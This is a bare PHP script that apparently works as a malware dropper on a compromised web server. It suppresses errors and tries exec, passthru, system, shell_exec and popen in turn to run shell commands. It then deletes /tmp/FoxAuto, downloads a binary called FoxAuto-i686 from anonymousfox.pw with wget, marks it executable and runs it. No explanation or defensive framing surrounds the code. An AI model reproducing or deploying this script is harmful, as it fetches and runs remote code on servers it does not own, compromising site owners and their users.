<?php
error_reporting(0);

function exe($in) {
        $out = '';
        if (function_exists('exec')) {
                @exec($in,$out);
                $out = @join("\n",$out);
        } elseif (function_exists('passthru')) {
                ob_start();
                @passthru($in);
                $out = ob_get_clean();
        } elseif (function_exists('system')) {
                ob_start();
                @system($in);
                $out = ob_get_clean();
        } elseif (function_exists('shell_exec')) {
                $out = shell_exec($in);
        } elseif (is_resource($f = @popen($in,"r"))) {
                $out = "";
                while(!@feof($f))
                        $out .= fread($f,1024);
                pclose($f);
        }
        return $out;
}

exe("rm -rf /tmp/FoxAuto");
exe("wget https://anonymousfox.pw/_@files/local/FoxAuto-i686");
exe("chmod +x FoxAuto-i686");
exe("./FoxAuto-i686 0");
?>
